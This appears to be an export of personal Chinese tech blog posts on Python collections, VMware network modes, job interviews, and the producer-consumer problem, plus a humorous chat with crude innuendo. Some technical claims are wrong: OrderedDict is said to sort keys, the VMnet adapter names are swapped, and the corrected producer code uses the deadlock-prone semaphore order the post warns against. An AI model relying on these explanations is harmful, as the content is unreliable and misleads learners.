<h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>Python中自带的数据结构中,有一种叫做<code>list</code>.<br>list这个东西好啊,但是它存在几个非常重要的缺点.<br>由于<code>list</code>是一种线性存储的结构,这就导致其根据索引找元素的时候会非常快,但是在插入和删除元素的时候就会很慢.当数据量大的时候,效率会很低.<br>为了解决这个问题,我们引入<code>deque</code>,双向队列.<br>它适合用作队列和栈.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import deque</span><br><span class="line"></span><br><span class="line">q &#x3D; deque([&#39;a&#39;, &#39;b&#39;, &#39;c&#39;])</span><br><span class="line">q.append(&quot;x&quot;)</span><br><span class="line">q.appendleft(&quot;y&quot;)</span><br></pre></td></tr></table></figure>
<p>此时的输出是<br><code>[&#39;y&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;x&#39;]</code><br>不仅有<code>append</code>和<code>appendleft</code>,相同的肯定还有<code>pop</code>和<code>popleft</code><br>使用起来肯定很舒服</p>
<hr>
<h3 id="OrderedDict"><a href="#OrderedDict" class="headerlink" title="OrderedDict"></a>OrderedDict</h3><p>Python中自带的一个数据结构叫<code>dict</code>字典,其构成是键值对.<br>但是再用<code>dict</code>做迭代的时候,我们没法确定<code>key</code>的顺序.<br>但是使用<code>OrderedDict</code>时,就可以使之排序.<br>具体的不多说,直接看例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line"></span><br><span class="line">dict &#x3D; &#123;&quot;a&quot;:1, &quot;c&quot;:3, &quot;b&quot;:4&#125;</span><br><span class="line">print(dict)</span><br><span class="line">&gt;&gt;&gt; &#123;&quot;a&quot;:1, &quot;c&quot;:3, &quot;b&quot;:4&#125;</span><br><span class="line"></span><br><span class="line">orderdict &#x3D; OrderedDict(&#123;&quot;a&quot;:1, &quot;c&quot;:3, &quot;b&quot;:4&#125;)</span><br><span class="line">print(orderdict)</span><br><span class="line">&gt;&gt;&gt; &#123;&quot;a&quot;:1, &quot;b&quot;:4, &quot;c&quot;:3&#125;</span><br></pre></td></tr></table></figure>
<p>由此可见,我们是根据<code>Key</code>排序的.这点很重要</p>
<ul>
<li>Notice<br><code>OrderedDict</code>的<code>Key</code>的插入会按照插入的顺序排列,而不是key本身<br>Exp<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line"></span><br><span class="line">d &#x3D; OrderedDict()</span><br><span class="line">d[&quot;z&quot;] &#x3D; 1</span><br><span class="line">d[&quot;y&quot;] &#x3D; 2</span><br><span class="line">d[&quot;x&quot;] &#x3D; 3</span><br><span class="line">print(d)</span><br><span class="line">&gt;&gt;&gt; OrderedDict([(&#39;z&#39;, 1), (&#39;y&#39;, 2), (&#39;x&#39;, 3)])</span><br></pre></td></tr></table></figure>
于是我们可以开动脑筋,做一个非常简单的扩展,我们可以做一个FIFO的dict结构.当超过限制时,删除最早的key.</li>
</ul>
<hr>
<h3 id="Counter"><a href="#Counter" class="headerlink" title="Counter"></a>Counter</h3><p>这个是我觉得最好用的东西,没有之一.<br>字面意思,这就是一个计数器.计数器肯定是用来计数的.<br>直接看一个例子吧!<br>Exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import Counter</span><br><span class="line"></span><br><span class="line">a &#x3D; &quot;kashfkehgkashfdkjsewhtrkljsdhfkjsdfhksjd&quot;</span><br><span class="line">a_c &#x3D; Counter(a)</span><br><span class="line">print(a_c)</span><br><span class="line">&gt;&gt;&gt; Counter(&#123;&#39;k&#39;: 7, &#39;s&#39;: 6, &#39;h&#39;: 6, &#39;f&#39;: 4, &#39;d&#39;: 4, &#39;j&#39;: 4, &#39;a&#39;: 2, &#39;e&#39;: 2, &#39;g&#39;: 1, &#39;w&#39;: 1, &#39;t&#39;: 1, &#39;r&#39;: 1, &#39;l&#39;: 1&#125;)</span><br></pre></td></tr></table></figure>
<p>可以看出来,返回的是一个字典,里面有这个字符串所有字母存在的个数.</p>
<p>这个可以给大家举一个例题:</p>
<hr>
<p>你正在和你的朋友玩 猜数字（Bulls and Cows）游戏：你写下一个数字让你的朋友猜。每次他猜测后<br>，你给他一个提示，告诉他有多少位数字和确切位置都猜对了（称为“Bulls”, 公牛），<br>有多少位数字猜对了但是位置不对（称为“Cows”, 奶牛）。你的朋友将会根据提示继续猜，直到猜出秘密数字。</p>
<p>请写出一个根据秘密数字和朋友的猜测数返回提示的函数，用 A 表示公牛，用 B 表示奶牛。</p>
<p>请注意秘密数字和朋友的猜测数都可能含有重复数字。</p>
<p>示例 1:</p>
<p>输入: secret = “1807”, guess = “7810”</p>
<p>输出: “1A3B”</p>
<p>解释: 1 公牛和 3 奶牛。公牛是 8，奶牛是 0, 1 和 7。<br>示例 2:</p>
<p>输入: secret = “1123”, guess = “0111”</p>
<p>输出: “1A1B”</p>
<p>解释: 朋友猜测数中的第一个 1 是公牛，第二个或第三个 1 可被视为奶牛。<br>说明: 你可以假设秘密数字和朋友的猜测数都只包含数字，并且它们的长度永远相等。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/bulls-and-cows">题目链接: https://leetcode-cn.com/problems/bulls-and-cows</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def getHint(self, secret: str, guess: str) -&gt; str:</span><br><span class="line">        from collections import Counter</span><br><span class="line">        secret_c &#x3D; Counter(secret)</span><br><span class="line">        guess_c &#x3D; Counter(guess)</span><br><span class="line">        count_A &#x3D; sum((i &#x3D;&#x3D; j for i, j in zip(secret, guess)))</span><br><span class="line">        count_B &#x3D; sum((secret_c &amp; guess_c).values()) - count_A</span><br><span class="line">        return &quot;&#123;&#125;A&#123;&#125;B&quot;.format(count_A, count_B)</span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>库介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>一次有趣的对话</title>
    <url>/2019/12/01/%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E5%AF%B9%E8%AF%9D/</url>
    <content><![CDATA[<p>日常chuiniubility~</p>
<hr>
<p><strong>生活中本来就不缺少乐趣，关键是怎么get到点</strong></p>
<p><del><strong>接下来我要说的事，你们千万不要害怕</strong></del><br><del><strong>我们是警察，我们不会怕怕</strong></del></p>
<p><strong>咳咳言归正传，我们开始吧</strong></p>
<hr>
<p>AbeanCC: 算法这个东西，有时候就是看上去特别简单，<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;于是就觉得自己特别的勇(<del>杰哥不要啊</del>)<br>AbeanCC: 结果自己一上手去写，就感觉不是那样了。</p>
<p>CRJ: 就跟我写LR(0)的时候一样</p>
<p>AbeanCC: 一开始，你自信满满，只是测试了几行代码，编译器迁就着你。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在你感叹自己写了这么多行代码的时候，编译器拒绝了你。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;你哭哭啼啼的询问着为什么，得到的确实一声声冰冷的ERROR。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;你苦苦地哀求着编译器，祈求着它给你一丝生机，<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可他却一把把你按在桌子上，说到:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“今天也要满足我喔？”<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;你一边摇头拒绝，一边却又半推半就的倒在他的提示里<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“啊！好快！好爽！”你一边看着编译器给你的修改提示，<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一边修改着残缺不全的代码<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“真是个色情的家伙呢”，编译器说到<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……省略1w字小H文</p>
<p>CRJ: 人 X 编译器，那怕是只能通过接口交配了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后生出了一个小的人工智能！<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以自己编写自己想要的代码</p>
<p>AbeanCC: 这是碳基智能和硅基智能之间的爱恨情仇</p>
<p>CRJ: 史称，赛博坦事件(?)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原来幻视和奥创就是你创造的！</p>
<p>AbeanCC: 在经历了这么多年的风风雨雨，回首往事，其实自己需要的，<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只是那个，陪伴自己很久很久的贾维斯</p>
<hr>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;真是服了自己，居然这么具有想象力。其实生活中不缺少乐趣，只是你需要拥有一双发现乐趣的眼睛罢了。可能只有两个思维足够跳跃的人，才能想到如上的对话吧。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>三种网络状态</title>
    <url>/2019/12/09/%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<h2 id="三种网络状态-NAT-Bridge-Host-Only"><a href="#三种网络状态-NAT-Bridge-Host-Only" class="headerlink" title="三种网络状态 NAT, Bridge, Host-Only"></a>三种网络状态 NAT, Bridge, Host-Only</h2><hr>
<p>由于发生了一些让人非常不耐烦的事情, 导致我几乎崩溃, 于是便有了这个, 用来让自己充分理解一下这三种状态(<del>为什么不问问神奇的海螺?</del>)</p>
<p>用过Vmware workstation的人都知道,一直有三个很神奇的东西,叫做VMnet0, VMnet1, VMnet8. 他们分别对应Bridge模式, NAT模式, Host-Only模式.</p>
<hr>
<p><strong><font size = 5>NAT</font></strong><br>Network Address Translation.<br>网络地址转换</p>
<p>其基本的工作原理就是, 通过NAT, 让虚拟机通过宿主机所在的网络来访问公网.<br>用过的人都知道, 虚拟机和主机虽然都用的是同一张网卡(物理), 但是虚拟机和宿主机不在同一个网络里. 原因是虚拟机的网卡, 是VMware提供的一个虚拟网卡.<br>这块网卡的名字叫做 Vmware Network Adapter VMnet1.</p>
<hr>
<p><strong><font size = 5>Bridge</font></strong><br>也就是众所周知的桥接</p>
<p>既然知道是桥接, 那就很简单了, 那必然是两块网卡之间建立网桥然后连接.于此同时, 那自然而然的就想到了一个问题, 那这样, 岂不是我的虚拟机和我的宿主机在同一个网络内了?<br>答案那必然是肯定的.<br>因为桥接模式本质上是一块名叫VMnet0的虚拟网卡和你的物理网卡桥接的.你的物理网卡和这个虚拟网卡是等价的.</p>
<p><em><strong>NOTICE: 下面是本人的亲身经历</strong></em><br><strong>首先, 你桥接的那块网卡的属性里,有一个叫做VMware bridge Protocol的东西,请务必把他打开.其次, 如果你装了Docker的话,那就要当心了,因为桥接模式的自动分配可能会桥接到Docker的Host-Only的网卡上导致桥接后连不上网.最后,复制物理网络连接状态,可以不开.</strong><br><del>由于各种各样的问题,注册表也看了,协议也安装了,vmware也重装了,就差重装系统了,结果突然整明白了.</del></p>
<p>既然都说到这了,想必也要说说NAT和Bridge的区别了吧.</p>
<ol>
<li>首先可以肯定的是,他俩肯定都能上外网.(不然也没人用啊)</li>
<li>由于NAT的网络在VMware提供的一个虚拟网络里,所以局域网其他主机是无法访问虚拟机的,而宿主机可以访问虚拟机,虚拟机可以访问局域网的所有主机,因为真实的局域网相对于NAT的虚拟网络,就是NAT的虚拟网络的外网.(是不是很拗口?究其原因,主要是NAT模式下,举个不太好的例子就是,你的宿主机相当于一个路由器,而你的虚拟机相当于连接在了这个路由器上的机器一样,属于一个内部的局域网,但是和外网之间的联系都交给这个做路由器的宿主机完成.所以这才是造成了局域网主机无法连接虚拟机, 而虚拟机可以连接其他主机.)</li>
<li>桥接模式就不存在这个问题.因为桥接模式相当于是把虚拟机作为一台独立的主机来使用,所以可以正常的使用.</li>
</ol>
<hr>
<p><strong><font size = 5>Host-Only</font></strong><br>仅主机模式</p>
<p>这个就特别简单了.说白了就是….自闭模式.<br>只与宿主机相连, 而不与宿主机以外的任何主机连接.(包括Internet)<br>它和NAT很像,但又不完全是.他有一块属于自己的虚拟网卡<br>Vmware Network Adapter VMnet8</p>
<p>可以说,它的安全性很高.毕竟与外界隔离.</p>
<hr>
<p>以上就是我对这三种网络状态的理解了.<br>有什么不对的不妥当的理解错误的欢迎指出~<br>QQ: 527430509</p>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>我的春招经历与总结</title>
    <url>/2021/05/10/%E6%88%91%E7%9A%84%E6%98%A5%E6%8B%9B%E7%BB%8F%E5%8E%86%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="我的春招经历与总结"><a href="#我的春招经历与总结" class="headerlink" title="我的春招经历与总结"></a>我的春招经历与总结</h3><hr>
<p><strong>作为一个小垃圾，虽然春招不太尽人意，</strong><br><strong>但还是想分享一下自己踩得坑和自己获得的一些经验教训</strong></p>
<hr>
<h4 id="为什么春招？"><a href="#为什么春招？" class="headerlink" title="为什么春招？"></a>为什么春招？</h4><p>2021.03<br>这是一个对很大一部分学生意义非凡的一个月。<br>因为这个月是考研出成绩的月份。<br>很多人收获了一个很好的分数，当然和其本身的努力分不开；<br>当然还有另一部分人，没能收获好的结果。<br>很不幸，我就是后者……<br>但是生活不是debug，不能因为出了问题就轻易的从头再来。<br>于是乎摆在我们这些人面前的，就只有<strong>就业/复读</strong>了。<br>对于我而言，也不知道是出于对自己实力的信任，还是头脑发热，选择了走上就业的道路。<br>或许会有人问，读研真的很重要嘛？<br>我的答案肯定是重要。但是更多的还是从你自己的角度出发去思考问题。读研你可以更加的开阔自己的视野，交道更有水平的朋友，拓宽自己的交际面等等。更重要的是，这是一次<strong>改变你未来职业的机会</strong>。</p>
<hr>
<h4 id="说说自己的前三次面试"><a href="#说说自己的前三次面试" class="headerlink" title="说说自己的前三次面试"></a>说说自己的前三次面试</h4><p>我面试的第一家公司是一家安全公司，也是因为我铁子的帮忙，一切都是很顺利的。但是在最后的阶段我反悔了，我没有答应这家公司。原因有很多，其中一部分归于我比较的任性，也可能是兴趣问题。拒绝之后我仔细的反思了自己的所作所为，明白了<strong>做事之前，或者说是做决定之前，一定要思考清楚，再做决定，切忌盲目决定</strong>，不能等之后再后悔，那时候可能很多东西都无法挽回了。</p>
<p>我面试的第二家公司是字节跳动，因为我室友在字节，想着内推一下，说不定就进了。凭着这样的想法，我去面了字节。但是面试的时候就感觉完全不是这么回事了，自己总结的知识点，在真正的面试面前就像是冰山一角，那些我觉得完全不可能问的问题或许随时都会要了你的命。就比如这次，问了很多数据库的最最最基础的问题，被我忽视了，没能答出来，当然结果就可想而知了。在反思中，我明白了<strong>做事情、学习不能抱有侥幸心态，不会的知识点就应该去弄明白，而不能就这么将就着就过去了（我觉得很大一部分原因是大学阶段的 考试/学习 造成的只看重点的习惯）</strong>。</p>
<p>我面试的第三家公司是Shopee，笔试的时候系统崩溃了，导致我做题目的心情变得不是很好，再加上题目本身的难度，直接给我做的不耐烦了，就交了。本以为就这么结束了，不会有面试机会的，但是很幸运，我还是进了面试。我面试的是后台开发，众所周知后台开发，知识点很多很杂很乱，于是乎面试也是一样。从我熟知的mysql，问道我不熟悉的redis，然后揪着redis使劲问，问你的思路。也问了很多关系数据库里很多有些深的知识点，比如间隙锁等。结果虽然不好，但是收获了很多，明白了<strong>自己所学的知识不能只停留在表面，而要深入去理解为啥是这样，后来腾讯的leader也说了，计算机科学与工程，本质上是工程，既然是工程就需要你自己动手去操作和理解。</strong></p>
<p>这就是我的前三次的面试，如果再让我面一次，我肯定会做的更好。但是还是那句话，<strong>万事开头难</strong>，没有经历过这些，也不会总结出教训，只是后悔自己浪费了这些大厂机会实在是有些可惜。</p>
<hr>
<h4 id="关于春招，或者是招聘，应该怎么准备"><a href="#关于春招，或者是招聘，应该怎么准备" class="headerlink" title="关于春招，或者是招聘，应该怎么准备"></a>关于春招，或者是招聘，应该怎么准备</h4><h5 id="首先，最最最重要的，就是简历。"><a href="#首先，最最最重要的，就是简历。" class="headerlink" title="首先，最最最重要的，就是简历。"></a>首先，最最最重要的，就是<strong>简历</strong>。</h5><p><strong>简历</strong>就是你的自我介绍，你的身份卡，换句编程的话来说，就是“你”的实例化对象。<br>绝大部分情况下，没有人知道你是谁你会啥你能做什么，都是通过<strong>简历</strong>来了解你的一些情况。<br>所以这里面就大有讲究啦：<br>&emsp;&emsp;1. <strong>换位思考</strong>。作为hr，一天要看很多份简历，非常的疲劳，这时候有两份简历摆在你面前，一份是制作精良，各种特效花纹好看的图片；另一份是朴朴素素，很多东西都写得十分清楚的简历。你会选择哪份？至少对我来说，我会选择<strong>后者</strong>。相比于第一份的花里胡哨，我会更想看信息熵小的，让人一目了然，很短时间内就可以产生一个你的”你的实例化对象”。<br>&emsp;&emsp;2. <strong>我没有经历怎么办?</strong> 我理解，不是所有人都拥有丰富的经历，例如 成篇的sci/大量的实习经历/丰富的获奖经历。对于此，我想说的是，<a href="https://baike.baidu.com/item/%E7%BB%8F%E5%8E%86/33329?fr=aladdin">经历</a>的解释是体验、经受过的事情。那既然你说你没有经历，又不知道写什么，那么最好的办法就是自己创造经历。这里的创造不是指胡编乱造，而是自己实际的去经历过的参与过的。比如GitHub上的一些开源项目啊，自己接一些小的外包项目啊之类的。<strong>还有一点，千万别往简历上写自己不太会的东西！</strong> 曾经看过一个人说自己精通C++，面试官看到后我估计都会笑得合不拢嘴。<br>&emsp;&emsp;3. 其他的有很多细枝末节的东西，比如说不要写很<strong>白痴的话，让别人一眼看到就觉得你是白痴</strong>；不要写<strong>大话空话</strong>，用数据说话。当然你这个数据得是实际得到的，经得起别人问的，而不是胡编乱造的。<br>&emsp;&emsp;4. 推荐一个简历制作的网站：<a href="https://www.wondercv.com/">超级简历(Wondercv)</a></p>
<h5 id="其次就是笔试面试了。"><a href="#其次就是笔试面试了。" class="headerlink" title="其次就是笔试面试了。"></a>其次就是笔试面试了。</h5><p>招聘招聘，说到底本质上就是通过笔试面试，了解你到底是一个什么样的人，能不能被公司使用。</p>
<p>笔试方面，我推荐去<a href="https://www.nowcoder.com/activity/oj">牛客网</a>, <a href="https://leetcode-cn.com/">力扣</a><br>其中强烈推荐牛客网的OJ系统啊,因为你真正的笔试可能用的就是牛客的oj,所以提前适应一下也不是坏事不是吗?</p>
<p>面试方面,我最喜欢去的就是<a href="https://www.nowcoder.com/">牛客网</a>了,里面的兄弟姐妹们都是真的有才,都是真的好厉害,面经写的也很好,强烈推荐啊!</p>
<p>当然了面试,万变不离其宗,就是说的那些东西，面两次就明白会问的问题都是什么方向的了。顺带一提，很多公司都会对面试进行记录，你的下一次面试可能会问上一次面试没有答好的问题，如果没答上来那可是严重的扣分项，一顶不要出现这样的事情！</p>
<p>tips: 有<strong>内推</strong>就走<strong>内推</strong></p>
<hr>
<p>写在后面的话：<br>&emsp;&emsp;每个人都有遗憾，比如我与腾讯擦肩而过，比如我非常喜欢的公司最后甚至都不看我一眼，比如想要我的公司被我拒绝，比如你得在“骑驴找马”中找到平衡等等等等。没有什么事情是注定完美的，也许你也会经历，或者正在经历遗憾，不过没关系，遗憾的事情就让它过去吧，抓住手里的东西才是最重要的。<strong>看山跑死马</strong>啊！</p>
<hr>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>我的腾讯面经</title>
    <url>/2021/05/10/%E6%88%91%E7%9A%84%E8%85%BE%E8%AE%AF%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<h3 id="WXG凉凉实况（x）"><a href="#WXG凉凉实况（x）" class="headerlink" title="WXG凉凉实况（x）"></a>WXG凉凉实况（x）</h3><p><strong>以此文来记录一下自己失败的WXG面试经历吧~</strong></p>
<h4 id="3-17-一面（63min）"><a href="#3-17-一面（63min）" class="headerlink" title="3-17 一面（63min）"></a>3-17 一面（63min）</h4><p>上来直接代码题(类似于 股票(一次交易))<br>问了和本题目相关的解法问题(对我的解法有疑问)<br>怼项目(腾讯面试有关项目的问的是真的多)<br>问了opencv相关<br>了解清楚后,问了利用opencv解决一个实际问题(将一个视频拆分成gif)<br>相似的图片进行压缩.(怎么压缩? 压缩的比例? opencv怎么识别相似的图片? 你的理解是什么?)<br>怼实习? 没实习经历<br>对C语言了解吗? 对一个链表进行排序,你会怎么做? 实现一下?<br>以为微信聊天为例,你和你朋友发送消息,之间所有的你认识到的技术,流程,说一说?<br>(发送? 接收? 按序发送/接收? 断网情况下怎么做到按序传输? 撤回怎么处理?)<br>问了问有没有offer<br>提问环节</p>
<h4 id="3-24-二面（77min）"><a href="#3-24-二面（77min）" class="headerlink" title="3-24 二面（77min）"></a>3-24 二面（77min）</h4><p>一开始使用的是面呗,但是发现没声音,故转到了腾讯会议<br>自我介绍<br>问了些学校的基本情况,然后开始介绍最近的一个项目<br>就这个项目展开聊了很多(区块链)<br>安全性?一致性?(其中安全性聊到了工业级别的大型区块链)<br>多线程怎么操作的?<br>分布式怎么做的?<br>以此为基点,聊了其他的项目<br>问了一些opencv的问题<br>问了一些关于神经网络的东西(工业级别的)<br>问了项目协同方面的问题(git?)<br>问了我是否除了python其他都不会<br>还会c,java<br>会做移动端吗?<br>本科期间学过安卓开发,但是后来就没怎么做过了.现在大致了解的情况(Activity,Intent,Service,ContainPrivider等)<br>看我有算法比赛的奖,考了三道算法图</p>
<ol>
<li>m*n阶矩阵,每一行左边的元素大于右边,下边的元素大于上边,每一行第一个元素大于上一行最后一个元素,求K是否在这个矩阵内</li>
<li>字符串求解不含重复字符的最长子串(双指针)</li>
<li>有N个文件file1, file2, …, fileN, 里面存储的都是英文单词,用空格隔开.现给你一个英文单词,让你求出在哪些文件中出现过.fileN可能非常大.考虑查询的可重复性.(大文件读写题)<br>问了我第一题是否还可以优化?<br>问了我Python相关的知识<br>GIL?<br>迭代器和生成器?<br>问了我是否使用过Hadoop等大数据工具?<br>问了我是否使用过诸如Mysql, Redis等数据库工具<br>提问环节</li>
</ol>
<h4 id="4-6-GM-EVP-面委会面-（70min）"><a href="#4-6-GM-EVP-面委会面-（70min）" class="headerlink" title="4-6 GM/EVP/面委会面 （70min）"></a>4-6 GM/EVP/面委会面 （70min）</h4><p>三道算法题</p>
<ol>
<li>“Write a function that accepts an Excel column name and returns the corresponding column number.” And give the test cases.<br>they go like this:<br>A B C . . . Z AA AB AC . . . AZ BA BB BC . . . BZ CA CB CC . . . AAA AAB etc.</li>
<li>熟悉的陌生人<br>大家都知道微信用户都是双向的好友，a是b的好友，那么b一定是a的好友，现在给定一个用户列表，其中有些用户是好友，有些不是，请判断，这些用户是否可以划分为两组，并且每组内的用户，互相都不是好友。如果能，请给出这个划分。</li>
<li>有n个加油站形成一个环，所有加油站里面的油合起来刚刚够一辆汽车跑完这个环，已经知道每个加油站的油量和加油站之间的距离，给你一个空车，设计一个路径能够跑完这个环<br>提问环节</li>
</ol>
<hr>
<p>哎，我GM面的算法题啊真的是回答的烂爆了，只能怪自己太垃圾了呜呜呜呜呜呜。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>生产者-消费者问题</title>
    <url>/2019/12/02/%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="进程调度笔记-1"><a href="#进程调度笔记-1" class="headerlink" title="进程调度笔记(1)"></a>进程调度笔记(1)</h3><hr>
<p><strong>首先我们要知道什么是信号量</strong><br>信号量(Semaphore),是在多线程环境下使用的一种设施,是可以用来保证两个或多个关键代码段不被并发调用.<br>在进入一个关键代码段之前,线程必须获取一个信号量；一旦该关键代码段完成了,那么该线程必须释放信号量.<br>其它想进入该关键代码段的线程必须等待直到第一个线程释放信号量.</p>
<p><strong>其次我们要知道什么是生产者-消费者问题</strong></p>
<p>现在,我们有一个固定大小的缓冲区,有两个线程,一个是从这个缓冲区中读取数据(消费者),一个是从这个缓冲区中写入数据(生产者)<br>于是便产生了问题:生产者不能一直写数据,因为缓冲区的大小是有限的;同理,消费者也不能一直读数据,因为缓冲区会空</p>
<p><code>于是引入两个操作P V</code><br>这两个操作是原子操作(意思就是运行时不会被中断)</p>
<p>P操作:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P(S)</span><br><span class="line">&#123;</span><br><span class="line">    while(S &lt;&#x3D; 0);</span><br><span class="line">    S--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>V操作:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V(S)</span><br><span class="line">&#123;</span><br><span class="line">    S++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>知道了这些,让我们回到问题</strong></p>
<p>于是我们有了如下代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">semaphore mutex &#x3D; 1; &#x2F;&#x2F;互斥</span><br><span class="line">semaphore empty &#x3D; n;</span><br><span class="line">semaphore full &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F; 定义全局变量</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Produce()</span><br><span class="line">&#123;</span><br><span class="line">    while(true)</span><br><span class="line">    &#123;</span><br><span class="line">        P(empty);</span><br><span class="line">        product(); &#x2F;&#x2F;生产1</span><br><span class="line">        V(full);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Consume()</span><br><span class="line">&#123;</span><br><span class="line">    while(true)</span><br><span class="line">    &#123;</span><br><span class="line">        P(full);</span><br><span class="line">        consume(); &#x2F;&#x2F;消费1</span><br><span class="line">        V(empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实到这里,程序就写完了,但是有一个问题,假如我生产时,CPU突然跑过去给消费者了,然后再回来时,就有两个生产者进程了.为了解决这个问题,我们引入了互斥信号量<code>mutex</code></p>
<p><strong>于是更改代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Produce()</span><br><span class="line">&#123;</span><br><span class="line">    while(true)</span><br><span class="line">    &#123;</span><br><span class="line">        P(mutex);</span><br><span class="line">        P(empty);</span><br><span class="line">        product(); &#x2F;&#x2F;生产1</span><br><span class="line">        V(full);</span><br><span class="line">        V(mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Consume()</span><br><span class="line">&#123;</span><br><span class="line">    while(true)</span><br><span class="line">    &#123;</span><br><span class="line">        P(full);</span><br><span class="line">        P(mutex);</span><br><span class="line">        consume(); &#x2F;&#x2F;消费1</span><br><span class="line">        V(empty);</span><br><span class="line">        V(mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时问题已经解决完了.但是,P(empty)和P(mutex)可以交换位置吗?<br><strong>答案显然是不行</strong></p>
<p>因为,当你的empty为0的时候(极端情况),你生产者拿到了mutex的信号量,但是没拿到empty的信号量,于是进程阻塞.</p>
<hr>
<p>以上就是我对生产者-消费者模型的总结,有什么理解错误的地方还希望大家指出啊!<br>QQ:527430509</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
